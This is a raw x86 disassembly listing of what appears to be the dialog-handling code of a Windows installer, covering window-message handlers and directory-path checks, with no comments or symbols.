  4041e1:	75 1b                	jne    0x4041fe
  4041e3:	39 2d b8 2e 47 00    	cmp    %ebp,0x472eb8
  4041e9:	74 13                	je     0x4041fe
  4041eb:	6a 0a                	push   $0xa
  4041ed:	57                   	push   %edi
  4041ee:	ff 15 68 82 40 00    	call   *0x408268
  4041f4:	c7 05 48 02 46 00 01 	movl   $0x1,0x460248
  4041fb:	00 00 00 
  4041fe:	33 c0                	xor    %eax,%eax
  404200:	5f                   	pop    %edi
  404201:	5e                   	pop    %esi
  404202:	5d                   	pop    %ebp
  404203:	5b                   	pop    %ebx
  404204:	83 c4 10             	add    $0x10,%esp
  404207:	c2 10 00             	ret    $0x10
  40420a:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  40420f:	75 06                	jne    0x404217
  404211:	ff 05 ac 2e 47 00    	incl   0x472eac
  404217:	6a 00                	push   $0x0
  404219:	ff 74 24 08          	push   0x8(%esp)
  40421d:	68 08 04 00 00       	push   $0x408
  404222:	ff 35 e8 ae 47 00    	push   0x47aee8
  404228:	ff 15 18 82 40 00    	call   *0x408218
  40422e:	c2 04 00             	ret    $0x4
  404231:	ff 74 24 0c          	push   0xc(%esp)
  404235:	6a 00                	push   $0x0
  404237:	e8 a0 20 00 00       	call   0x4062dc
  40423c:	50                   	push   %eax
  40423d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404241:	05 e8 03 00 00       	add    $0x3e8,%eax
  404246:	50                   	push   %eax
  404247:	ff 74 24 0c          	push   0xc(%esp)
  40424b:	e8 ae 16 00 00       	call   0x4058fe
  404250:	c2 0c 00             	ret    $0xc
  404253:	ff 74 24 04          	push   0x4(%esp)
  404257:	ff 35 44 02 45 00    	push   0x450244
  40425d:	ff 15 10 82 40 00    	call   *0x408210
  404263:	c2 04 00             	ret    $0x4
  404266:	6a 01                	push   $0x1
  404268:	ff 74 24 08          	push   0x8(%esp)
  40426c:	6a 28                	push   $0x28
  40426e:	ff 35 e8 ae 47 00    	push   0x47aee8
  404274:	ff 15 18 82 40 00    	call   *0x408218
  40427a:	c2 04 00             	ret    $0x4
  40427d:	a1 b8 2e 47 00       	mov    0x472eb8,%eax
  404282:	85 c0                	test   %eax,%eax
  404284:	74 0f                	je     0x404295
  404286:	6a 00                	push   $0x0
  404288:	6a 00                	push   $0x0
  40428a:	ff 74 24 0c          	push   0xc(%esp)
  40428e:	50                   	push   %eax
  40428f:	ff 15 18 82 40 00    	call   *0x408218
  404295:	c2 04 00             	ret    $0x4
  404298:	55                   	push   %ebp
  404299:	8b ec                	mov    %esp,%ebp
  40429b:	83 ec 0c             	sub    $0xc,%esp
  40429e:	8b 45 08             	mov    0x8(%ebp),%eax
  4042a1:	56                   	push   %esi
  4042a2:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  4042a7:	83 f8 05             	cmp    $0x5,%eax
  4042aa:	0f 87 b0 00 00 00    	ja     0x404360
  4042b0:	6a eb                	push   $0xffffffeb
  4042b2:	ff 75 10             	push   0x10(%ebp)
  4042b5:	ff 15 ac 81 40 00    	call   *0x4081ac
  4042bb:	8b f0                	mov    %eax,%esi
  4042bd:	85 f6                	test   %esi,%esi
  4042bf:	0f 84 9b 00 00 00    	je     0x404360
  4042c5:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  4042c9:	0f 87 91 00 00 00    	ja     0x404360
  4042cf:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  4042d3:	0f 87 87 00 00 00    	ja     0x404360
  4042d9:	8b 4e 14             	mov    0x14(%esi),%ecx
  4042dc:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  4042e2:	75 7c                	jne    0x404360
  4042e4:	8b 06                	mov    (%esi),%eax
  4042e6:	57                   	push   %edi
  4042e7:	8b 3d a8 81 40 00    	mov    0x4081a8,%edi
  4042ed:	f6 c1 02             	test   $0x2,%cl
  4042f0:	74 03                	je     0x4042f5
  4042f2:	50                   	push   %eax
  4042f3:	ff d7                	call   *%edi
  4042f5:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  4042f9:	74 0a                	je     0x404305
  4042fb:	50                   	push   %eax
  4042fc:	ff 75 0c             	push   0xc(%ebp)
  4042ff:	ff 15 58 80 40 00    	call   *0x408058
  404305:	ff 76 10             	push   0x10(%esi)
  404308:	ff 75 0c             	push   0xc(%ebp)
  40430b:	ff 15 50 80 40 00    	call   *0x408050
  404311:	8b 46 04             	mov    0x4(%esi),%eax
  404314:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  404318:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40431b:	74 06                	je     0x404323
  40431d:	50                   	push   %eax
  40431e:	ff d7                	call   *%edi
  404320:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404323:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  404327:	5f                   	pop    %edi
  404328:	74 0a                	je     0x404334
  40432a:	50                   	push   %eax
  40432b:	ff 75 0c             	push   0xc(%ebp)
  40432e:	ff 15 68 80 40 00    	call   *0x408068
  404334:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  404338:	74 21                	je     0x40435b
  40433a:	8b 46 08             	mov    0x8(%esi),%eax
  40433d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404340:	8b 46 0c             	mov    0xc(%esi),%eax
  404343:	85 c0                	test   %eax,%eax
  404345:	74 07                	je     0x40434e
  404347:	50                   	push   %eax
  404348:	ff 15 5c 80 40 00    	call   *0x40805c
  40434e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404351:	50                   	push   %eax
  404352:	ff 15 64 80 40 00    	call   *0x408064
  404358:	89 46 0c             	mov    %eax,0xc(%esi)
  40435b:	8b 46 0c             	mov    0xc(%esi),%eax
  40435e:	eb 02                	jmp    0x404362
  404360:	33 c0                	xor    %eax,%eax
  404362:	5e                   	pop    %esi
  404363:	c9                   	leave
  404364:	c2 0c 00             	ret    $0xc
  404367:	55                   	push   %ebp
  404368:	8b ec                	mov    %esp,%ebp
  40436a:	8b 45 10             	mov    0x10(%ebp),%eax
  40436d:	8b 0d 14 02 44 00    	mov    0x440214,%ecx
  404373:	d1 e8                	shr    $1,%eax
  404375:	50                   	push   %eax
  404376:	8b 45 08             	mov    0x8(%ebp),%eax
  404379:	03 c8                	add    %eax,%ecx
  40437b:	51                   	push   %ecx
  40437c:	ff 75 0c             	push   0xc(%ebp)
  40437f:	ff 15 b0 80 40 00    	call   *0x4080b0
  404385:	ff 75 0c             	push   0xc(%ebp)
  404388:	ff 15 ac 80 40 00    	call   *0x4080ac
  40438e:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404391:	03 c0                	add    %eax,%eax
  404393:	89 01                	mov    %eax,(%ecx)
  404395:	01 05 14 02 44 00    	add    %eax,0x440214
  40439b:	33 c0                	xor    %eax,%eax
  40439d:	5d                   	pop    %ebp
  40439e:	c2 10 00             	ret    $0x10
  4043a1:	55                   	push   %ebp
  4043a2:	8b ec                	mov    %esp,%ebp
  4043a4:	a1 14 02 44 00       	mov    0x440214,%eax
  4043a9:	56                   	push   %esi
  4043aa:	8b 75 08             	mov    0x8(%ebp),%esi
  4043ad:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4043b0:	50                   	push   %eax
  4043b1:	ff 15 ac 80 40 00    	call   *0x4080ac
  4043b7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4043ba:	d1 e9                	shr    $1,%ecx
  4043bc:	3b c1                	cmp    %ecx,%eax
  4043be:	72 02                	jb     0x4043c2
  4043c0:	8b c1                	mov    %ecx,%eax
  4043c2:	33 c9                	xor    %ecx,%ecx
  4043c4:	51                   	push   %ecx
  4043c5:	51                   	push   %ecx
  4043c6:	ff 75 10             	push   0x10(%ebp)
  4043c9:	ff 75 0c             	push   0xc(%ebp)
  4043cc:	50                   	push   %eax
  4043cd:	a1 14 02 44 00       	mov    0x440214,%eax
  4043d2:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4043d5:	50                   	push   %eax
  4043d6:	51                   	push   %ecx
  4043d7:	51                   	push   %ecx
  4043d8:	ff 15 5c 81 40 00    	call   *0x40815c
  4043de:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4043e1:	5e                   	pop    %esi
  4043e2:	89 01                	mov    %eax,(%ecx)
  4043e4:	01 05 14 02 44 00    	add    %eax,0x440214
  4043ea:	33 c0                	xor    %eax,%eax
  4043ec:	5d                   	pop    %ebp
  4043ed:	c2 10 00             	ret    $0x10
  4043f0:	55                   	push   %ebp
  4043f1:	8b ec                	mov    %esp,%ebp
  4043f3:	83 ec 0c             	sub    $0xc,%esp
  4043f6:	53                   	push   %ebx
  4043f7:	33 db                	xor    %ebx,%ebx
  4043f9:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404400:	56                   	push   %esi
  404401:	57                   	push   %edi
  404402:	0f 85 1a 01 00 00    	jne    0x404522
  404408:	8b 7d 14             	mov    0x14(%ebp),%edi
  40440b:	8b 47 30             	mov    0x30(%edi),%eax
  40440e:	3b c3                	cmp    %ebx,%eax
  404410:	7d 11                	jge    0x404423
  404412:	8b 0d bc 2e 47 00    	mov    0x472ebc,%ecx
  404418:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40441f:	2b c8                	sub    %eax,%ecx
  404421:	8b 01                	mov    (%ecx),%eax
  404423:	8b 0d 38 af 47 00    	mov    0x47af38,%ecx
  404429:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  40442c:	0f b7 08             	movzwl (%eax),%ecx
  40442f:	40                   	inc    %eax
  404430:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404433:	40                   	inc    %eax
  404434:	83 f9 02             	cmp    $0x2,%ecx
  404437:	89 45 14             	mov    %eax,0x14(%ebp)
  40443a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40443d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  404440:	c7 45 fc a1 43 40 00 	movl   $0x4043a1,-0x4(%ebp)
  404447:	74 07                	je     0x404450
  404449:	c7 45 fc 67 43 40 00 	movl   $0x404367,-0x4(%ebp)
  404450:	8b 47 14             	mov    0x14(%edi),%eax
  404453:	ff 77 34             	push   0x34(%edi)
  404456:	8b f0                	mov    %eax,%esi
  404458:	83 e0 01             	and    $0x1,%eax
  40445b:	f7 d6                	not    %esi
  40445d:	c1 ee 05             	shr    $0x5,%esi
  404460:	6a 22                	push   $0x22
  404462:	83 e6 01             	and    $0x1,%esi
  404465:	ff 75 08             	push   0x8(%ebp)
  404468:	0b f0                	or     %eax,%esi
  40446a:	e8 c2 fd ff ff       	call   0x404231
  40446f:	ff 77 38             	push   0x38(%edi)
  404472:	6a 23                	push   $0x23
  404474:	ff 75 08             	push   0x8(%ebp)
  404477:	e8 b5 fd ff ff       	call   0x404231
  40447c:	33 c0                	xor    %eax,%eax
  40447e:	3b f3                	cmp    %ebx,%esi
  404480:	0f 94 c0             	sete   %al
  404483:	05 0a 04 00 00       	add    $0x40a,%eax
  404488:	6a 01                	push   $0x1
  40448a:	50                   	push   %eax
  40448b:	ff 75 08             	push   0x8(%ebp)
  40448e:	ff 15 b8 81 40 00    	call   *0x4081b8
  404494:	56                   	push   %esi
  404495:	e8 b9 fd ff ff       	call   0x404253
  40449a:	68 e8 03 00 00       	push   $0x3e8
  40449f:	ff 75 08             	push   0x8(%ebp)
  4044a2:	ff 15 e4 81 40 00    	call   *0x4081e4
  4044a8:	8b f8                	mov    %eax,%edi
  4044aa:	57                   	push   %edi
  4044ab:	e8 b6 fd ff ff       	call   0x404266
  4044b0:	8b 35 18 82 40 00    	mov    0x408218,%esi
  4044b6:	53                   	push   %ebx
  4044b7:	6a 01                	push   $0x1
  4044b9:	68 5b 04 00 00       	push   $0x45b
  4044be:	57                   	push   %edi
  4044bf:	ff d6                	call   *%esi
  4044c1:	a1 f4 ae 47 00       	mov    0x47aef4,%eax
  4044c6:	8b 40 68             	mov    0x68(%eax),%eax
  4044c9:	3b c3                	cmp    %ebx,%eax
  4044cb:	7d 09                	jge    0x4044d6
  4044cd:	f7 d8                	neg    %eax
  4044cf:	50                   	push   %eax
  4044d0:	ff 15 a8 81 40 00    	call   *0x4081a8
  4044d6:	50                   	push   %eax
  4044d7:	53                   	push   %ebx
  4044d8:	68 43 04 00 00       	push   $0x443
  4044dd:	57                   	push   %edi
  4044de:	ff d6                	call   *%esi
  4044e0:	68 00 00 01 04       	push   $0x4010000
  4044e5:	53                   	push   %ebx
  4044e6:	68 45 04 00 00       	push   $0x445
  4044eb:	57                   	push   %edi
  4044ec:	ff d6                	call   *%esi
  4044ee:	ff 75 14             	push   0x14(%ebp)
  4044f1:	e8 da 1d 00 00       	call   0x4062d0
  4044f6:	50                   	push   %eax
  4044f7:	53                   	push   %ebx
  4044f8:	68 35 04 00 00       	push   $0x435
  4044fd:	57                   	push   %edi
  4044fe:	ff d6                	call   *%esi
  404500:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404503:	89 1d 14 02 44 00    	mov    %ebx,0x440214
  404509:	50                   	push   %eax
  40450a:	ff 75 0c             	push   0xc(%ebp)
  40450d:	68 49 04 00 00       	push   $0x449
  404512:	57                   	push   %edi
  404513:	ff d6                	call   *%esi
  404515:	89 1d 14 02 44 00    	mov    %ebx,0x440214
  40451b:	33 c0                	xor    %eax,%eax
  40451d:	e9 52 01 00 00       	jmp    0x404674
  404522:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404529:	8b 35 18 82 40 00    	mov    0x408218,%esi
  40452f:	75 5b                	jne    0x40458c
  404531:	8b 45 10             	mov    0x10(%ebp),%eax
  404534:	c1 e8 10             	shr    $0x10,%eax
  404537:	66 85 c0             	test   %ax,%ax
  40453a:	0f 85 25 01 00 00    	jne    0x404665
  404540:	39 1d 14 02 44 00    	cmp    %ebx,0x440214
  404546:	0f 85 19 01 00 00    	jne    0x404665
  40454c:	a1 20 82 44 00       	mov    0x448220,%eax
  404551:	8d 78 14             	lea    0x14(%eax),%edi
  404554:	f6 07 20             	testb  $0x20,(%edi)
  404557:	0f 84 08 01 00 00    	je     0x404665
  40455d:	53                   	push   %ebx
  40455e:	53                   	push   %ebx
  40455f:	68 f0 00 00 00       	push   $0xf0
  404564:	68 0a 04 00 00       	push   $0x40a
  404569:	ff 75 08             	push   0x8(%ebp)
  40456c:	ff 15 e4 81 40 00    	call   *0x4081e4
  404572:	50                   	push   %eax
  404573:	ff d6                	call   *%esi
  404575:	8b 0f                	mov    (%edi),%ecx
  404577:	83 e0 01             	and    $0x1,%eax
  40457a:	83 e1 fe             	and    $0xfffffffe,%ecx
  40457d:	50                   	push   %eax
  40457e:	0b c8                	or     %eax,%ecx
  404580:	89 0f                	mov    %ecx,(%edi)
  404582:	e8 cc fc ff ff       	call   0x404253
  404587:	e8 ef 00 00 00       	call   0x40467b
  40458c:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404590:	0f 85 c0 00 00 00    	jne    0x404656
  404596:	68 e8 03 00 00       	push   $0x3e8
  40459b:	ff 75 08             	push   0x8(%ebp)
  40459e:	ff 15 e4 81 40 00    	call   *0x4081e4
  4045a4:	8b 7d 14             	mov    0x14(%ebp),%edi
  4045a7:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4045ae:	75 67                	jne    0x404617
  4045b0:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4045b7:	75 5e                	jne    0x404617
  4045b9:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4045bc:	8b 57 18             	mov    0x18(%edi),%edx
  4045bf:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4045c2:	2b ca                	sub    %edx,%ecx
  4045c4:	81 f9 00 40 00 00    	cmp    $0x4000,%ecx
  4045ca:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4045cd:	c7 45 fc 80 ae 46 00 	movl   $0x46ae80,-0x4(%ebp)
  4045d4:	73 41                	jae    0x404617
  4045d6:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4045d9:	51                   	push   %ecx
  4045da:	53                   	push   %ebx
  4045db:	68 4b 04 00 00       	push   $0x44b
  4045e0:	50                   	push   %eax
  4045e1:	ff d6                	call   *%esi
  4045e3:	8b 3d b4 81 40 00    	mov    0x4081b4,%edi
  4045e9:	68 02 7f 00 00       	push   $0x7f02
  4045ee:	53                   	push   %ebx
  4045ef:	ff d7                	call   *%edi
  4045f1:	50                   	push   %eax
  4045f2:	ff 15 b0 81 40 00    	call   *0x4081b0
  4045f8:	6a 01                	push   $0x1
  4045fa:	ff 75 fc             	push   -0x4(%ebp)
  4045fd:	ff 75 08             	push   0x8(%ebp)
  404600:	e8 9a 00 00 00       	call   0x40469f
  404605:	68 00 7f 00 00       	push   $0x7f00
  40460a:	53                   	push   %ebx
  40460b:	ff d7                	call   *%edi
  40460d:	50                   	push   %eax
  40460e:	ff 15 b0 81 40 00    	call   *0x4081b0
  404614:	8b 7d 14             	mov    0x14(%ebp),%edi
  404617:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  40461e:	75 48                	jne    0x404668
  404620:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  404627:	75 3f                	jne    0x404668
  404629:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  40462d:	75 10                	jne    0x40463f
  40462f:	53                   	push   %ebx
  404630:	6a 01                	push   $0x1
  404632:	68 11 01 00 00       	push   $0x111
  404637:	ff 35 e8 ae 47 00    	push   0x47aee8
  40463d:	ff d6                	call   *%esi
  40463f:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404643:	75 0c                	jne    0x404651
  404645:	53                   	push   %ebx
  404646:	53                   	push   %ebx
  404647:	6a 10                	push   $0x10
  404649:	ff 35 e8 ae 47 00    	push   0x47aee8
  40464f:	ff d6                	call   *%esi
  404651:	33 c0                	xor    %eax,%eax
  404653:	40                   	inc    %eax
  404654:	eb 1e                	jmp    0x404674
  404656:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40465d:	75 06                	jne    0x404665
  40465f:	ff 05 14 02 44 00    	incl   0x440214
  404665:	8b 7d 14             	mov    0x14(%ebp),%edi
  404668:	57                   	push   %edi
  404669:	ff 75 10             	push   0x10(%ebp)
  40466c:	ff 75 0c             	push   0xc(%ebp)
  40466f:	e8 24 fc ff ff       	call   0x404298
  404674:	5f                   	pop    %edi
  404675:	5e                   	pop    %esi
  404676:	5b                   	pop    %ebx
  404677:	c9                   	leave
  404678:	c2 10 00             	ret    $0x10
  40467b:	83 3d 8c af 47 00 00 	cmpl   $0x0,0x47af8c
  404682:	a1 10 02 44 00       	mov    0x440210,%eax
  404687:	75 05                	jne    0x40468e
  404689:	a1 44 02 45 00       	mov    0x450244,%eax
  40468e:	6a 01                	push   $0x1
  404690:	6a 01                	push   $0x1
  404692:	68 f4 00 00 00       	push   $0xf4
  404697:	50                   	push   %eax
  404698:	ff 15 18 82 40 00    	call   *0x408218
  40469e:	c3                   	ret
  40469f:	55                   	push   %ebp
  4046a0:	8b ec                	mov    %esp,%ebp
  4046a2:	83 ec 3c             	sub    $0x3c,%esp
  4046a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4046a8:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  4046ac:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  4046b0:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4046b3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4046b6:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  4046bd:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4046c0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4046c3:	50                   	push   %eax
  4046c4:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4046cb:	c7 45 d0 94 a3 40 00 	movl   $0x40a394,-0x30(%ebp)
  4046d2:	e8 0f 12 00 00       	call   0x4058e6
  4046d7:	c9                   	leave
  4046d8:	c2 0c 00             	ret    $0xc
  4046db:	55                   	push   %ebp
  4046dc:	8b ec                	mov    %esp,%ebp
  4046de:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4046e5:	56                   	push   %esi
  4046e6:	8b 75 14             	mov    0x14(%ebp),%esi
  4046e9:	75 26                	jne    0x404711
  4046eb:	ff 76 30             	push   0x30(%esi)
  4046ee:	6a 1d                	push   $0x1d
  4046f0:	ff 75 08             	push   0x8(%ebp)
  4046f3:	e8 39 fb ff ff       	call   0x404231
  4046f8:	8b 46 3c             	mov    0x3c(%esi),%eax
  4046fb:	c1 e0 0e             	shl    $0xe,%eax
  4046fe:	05 00 b0 47 00       	add    $0x47b000,%eax
  404703:	50                   	push   %eax
  404704:	68 e8 03 00 00       	push   $0x3e8
  404709:	ff 75 08             	push   0x8(%ebp)
  40470c:	e8 ed 11 00 00       	call   0x4058fe
  404711:	56                   	push   %esi
  404712:	ff 75 10             	push   0x10(%ebp)
  404715:	ff 75 0c             	push   0xc(%ebp)
  404718:	e8 7b fb ff ff       	call   0x404298
  40471d:	5e                   	pop    %esi
  40471e:	5d                   	pop    %ebp
  40471f:	c2 10 00             	ret    $0x10
  404722:	55                   	push   %ebp
  404723:	8b ec                	mov    %esp,%ebp
  404725:	83 ec 4c             	sub    $0x4c,%esp
  404728:	a1 20 82 44 00       	mov    0x448220,%eax
  40472d:	53                   	push   %ebx
  40472e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404731:	56                   	push   %esi
  404732:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404735:	8b 40 38             	mov    0x38(%eax),%eax
  404738:	c1 e3 0e             	shl    $0xe,%ebx
  40473b:	81 c3 00 b0 47 00    	add    $0x47b000,%ebx
  404741:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404748:	57                   	push   %edi
  404749:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40474c:	75 11                	jne    0x40475f
  40474e:	53                   	push   %ebx
  40474f:	68 fb 03 00 00       	push   $0x3fb
  404754:	e8 ab 11 00 00       	call   0x405904
  404759:	53                   	push   %ebx
  40475a:	e8 ef 1d 00 00       	call   0x40654e
  40475f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404766:	8b 75 08             	mov    0x8(%ebp),%esi
  404769:	75 6c                	jne    0x4047d7
  40476b:	68 fb 03 00 00       	push   $0x3fb
  404770:	56                   	push   %esi
  404771:	ff 15 e4 81 40 00    	call   *0x4081e4
  404777:	53                   	push   %ebx
  404778:	8b f8                	mov    %eax,%edi
  40477a:	e8 87 14 00 00       	call   0x405c06
  40477f:	85 c0                	test   %eax,%eax
  404781:	74 10                	je     0x404793
  404783:	53                   	push   %ebx
  404784:	e8 b1 14 00 00       	call   0x405c3a
  404789:	85 c0                	test   %eax,%eax
  40478b:	75 06                	jne    0x404793
  40478d:	53                   	push   %ebx
  40478e:	e8 fc 13 00 00       	call   0x405b8f
  404793:	53                   	push   %ebx
  404794:	57                   	push   %edi
  404795:	89 35 b8 2e 47 00    	mov    %esi,0x472eb8
  40479b:	ff 15 5c 82 40 00    	call   *0x40825c
  4047a1:	8b 45 14             	mov    0x14(%ebp),%eax
  4047a4:	ff 70 34             	push   0x34(%eax)
  4047a7:	6a 01                	push   $0x1
  4047a9:	56                   	push   %esi
  4047aa:	e8 82 fa ff ff       	call   0x404231
  4047af:	8b 45 14             	mov    0x14(%ebp),%eax
  4047b2:	ff 70 30             	push   0x30(%eax)
  4047b5:	6a 14                	push   $0x14
  4047b7:	56                   	push   %esi
  4047b8:	e8 74 fa ff ff       	call   0x404231
  4047bd:	57                   	push   %edi
  4047be:	e8 a3 fa ff ff       	call   0x404266
  4047c3:	6a 07                	push   $0x7
  4047c5:	e8 ca 1e 00 00       	call   0x406694
  4047ca:	85 c0                	test   %eax,%eax
  4047cc:	0f 84 91 02 00 00    	je     0x404a63
  4047d2:	6a 01                	push   $0x1
  4047d4:	57                   	push   %edi
  4047d5:	ff d0                	call   *%eax
  4047d7:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4047de:	0f 85 d1 00 00 00    	jne    0x4048b5
  4047e4:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  4047e8:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  4047ed:	75 18                	jne    0x404807
  4047ef:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4047f2:	c1 e9 10             	shr    $0x10,%ecx
  4047f5:	66 81 f9 00 03       	cmp    $0x300,%cx
  4047fa:	0f 85 63 02 00 00    	jne    0x404a63
  404800:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404807:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  40480c:	0f 85 a3 00 00 00    	jne    0x4048b5
  404812:	6a 07                	push   $0x7
  404814:	33 c0                	xor    %eax,%eax
  404816:	59                   	pop    %ecx
  404817:	8d 7d b8             	lea    -0x48(%ebp),%edi
  40481a:	ff 75 f8             	push   -0x8(%ebp)
  40481d:	f3 ab                	rep stos %eax,%es:(%edi)
  40481f:	bf 48 02 45 00       	mov    $0x450248,%edi
  404824:	68 20 42 44 00       	push   $0x444220
  404829:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  40482c:	89 7d bc             	mov    %edi,-0x44(%ebp)
  40482f:	c7 45 c8 78 4a 40 00 	movl   $0x404a78,-0x38(%ebp)
  404836:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404839:	e8 9e 1a 00 00       	call   0x4062dc
  40483e:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404841:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404844:	50                   	push   %eax
  404845:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  40484c:	ff 15 84 81 40 00    	call   *0x408184
  404852:	85 c0                	test   %eax,%eax
  404854:	74 58                	je     0x4048ae
  404856:	50                   	push   %eax
  404857:	ff 15 a4 82 40 00    	call   *0x4082a4
  40485d:	53                   	push   %ebx
  40485e:	e8 2c 13 00 00       	call   0x405b8f
  404863:	a1 f4 ae 47 00       	mov    0x47aef4,%eax
  404868:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  40486e:	85 c0                	test   %eax,%eax
  404870:	74 28                	je     0x40489a
  404872:	81 fb 00 f0 4c 00    	cmp    $0x4cf000,%ebx
  404878:	75 20                	jne    0x40489a
  40487a:	50                   	push   %eax
  40487b:	6a 00                	push   $0x0
  40487d:	e8 5a 1a 00 00       	call   0x4062dc
  404882:	57                   	push   %edi
  404883:	bf 80 ae 46 00       	mov    $0x46ae80,%edi
  404888:	57                   	push   %edi
  404889:	ff 15 04 81 40 00    	call   *0x408104
  40488f:	85 c0                	test   %eax,%eax
  404891:	74 07                	je     0x40489a
  404893:	57                   	push   %edi
  404894:	53                   	push   %ebx
  404895:	e8 3c 1a 00 00       	call   0x4062d6
  40489a:	ff 05 38 02 45 00    	incl   0x450238
  4048a0:	53                   	push   %ebx
  4048a1:	68 fb 03 00 00       	push   $0x3fb
  4048a6:	56                   	push   %esi
  4048a7:	e8 52 10 00 00       	call   0x4058fe
  4048ac:	eb 07                	jmp    0x4048b5
  4048ae:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4048b5:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4048bc:	74 0d                	je     0x4048cb
  4048be:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4048c5:	0f 85 98 01 00 00    	jne    0x404a63
  4048cb:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4048cf:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4048d3:	53                   	push   %ebx
  4048d4:	68 fb 03 00 00       	push   $0x3fb
  4048d9:	e8 26 10 00 00       	call   0x405904
  4048de:	53                   	push   %ebx
  4048df:	e8 b3 13 00 00       	call   0x405c97
  4048e4:	85 c0                	test   %eax,%eax
  4048e6:	75 07                	jne    0x4048ef
  4048e8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4048ef:	be 18 02 44 00       	mov    $0x440218,%esi
  4048f4:	53                   	push   %ebx
  4048f5:	56                   	push   %esi
  4048f6:	e8 bf 19 00 00       	call   0x4062ba
  4048fb:	6a 01                	push   $0x1
  4048fd:	e8 92 1d 00 00       	call   0x406694
  404902:	85 c0                	test   %eax,%eax
  404904:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404907:	74 3a                	je     0x404943
  404909:	33 c0                	xor    %eax,%eax
  40490b:	33 ff                	xor    %edi,%edi
  40490d:	3b c6                	cmp    %esi,%eax
  40490f:	74 32                	je     0x404943
  404911:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404914:	50                   	push   %eax
  404915:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404918:	50                   	push   %eax
  404919:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40491c:	50                   	push   %eax
  40491d:	56                   	push   %esi
  40491e:	ff 55 f4             	call   *-0xc(%ebp)
  404921:	85 c0                	test   %eax,%eax
  404923:	75 76                	jne    0x40499b
  404925:	85 ff                	test   %edi,%edi
  404927:	74 03                	je     0x40492c
  404929:	66 21 07             	and    %ax,(%edi)
  40492c:	56                   	push   %esi
  40492d:	e8 a9 12 00 00       	call   0x405bdb
  404932:	8b f8                	mov    %eax,%edi
  404934:	66 83 27 00          	andw   $0x0,(%edi)
  404938:	4f                   	dec    %edi
  404939:	4f                   	dec    %edi
  40493a:	3b fe                	cmp    %esi,%edi
  40493c:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
